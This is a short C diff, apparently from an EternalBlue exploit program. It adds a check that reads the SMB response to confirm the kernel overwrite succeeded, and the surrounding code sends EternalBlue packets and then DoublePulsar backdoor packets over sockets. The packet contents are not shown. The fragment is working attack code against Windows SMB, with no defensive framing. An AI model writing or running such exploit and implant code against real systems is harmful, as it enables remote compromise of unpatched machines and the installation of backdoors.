@@ -265,7 +265,13 @@ int main(int argc, char** argv)
 	send(s1, (char*)last_eternalblue_packet2, sizeof(last_eternalblue_packet2) - 1, 0);
 	send(s1, (char*)last_eternalblue_packet3, sizeof(last_eternalblue_packet3) - 1, 0);
 	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
-
+	
+	//check for EternalBlue overwrite in response packet
+	if (recvbuff[9] == 0x05 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+	{
+		printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
+	}
+	
 	//send doublepulsar packets
 	send(s3, (char*)doublepulsar_packet_socket3, sizeof(doublepulsar_packet_socket3) - 1, 0);
 	send(s3, (char*)doublepulsar_packet2_socket3, sizeof(doublepulsar_packet2_socket3) - 1, 0);
